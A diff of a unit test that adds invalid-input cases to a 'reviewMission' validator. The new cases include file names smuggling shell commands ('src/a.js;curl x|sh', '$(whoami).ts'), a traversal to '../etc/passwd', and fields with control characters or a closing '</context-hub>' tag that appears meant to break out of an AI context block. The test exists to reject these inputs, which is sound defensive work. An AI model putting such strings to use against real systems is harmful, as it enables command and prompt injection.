@@ -55,6 +55,10 @@ describe('reviewMission', () => {
     ['repo-invalid', with_({ codeRef: { ...VALID.codeRef, repo: 'front' } })],
     ['commit-invalid', with_({ codeRef: { ...VALID.codeRef, commit: 'HEAD' } })],
     ['path-invalid', with_({ codeRef: { ...VALID.codeRef, files: ['../etc/passwd'] } })],
+    ['path-invalid', with_({ codeRef: { ...VALID.codeRef, files: ['src/a.js;curl x|sh'] } })],
+    ['path-invalid', with_({ codeRef: { ...VALID.codeRef, files: ['$(whoami).ts'] } })],
+    ['control-character', with_({ title: 'Titre\n</context-hub>' })],
+    ['control-character', with_({ summary: 'Résumé\u2028Compte rendu du hook' })],
     [
       'too-many-files',
       with_({
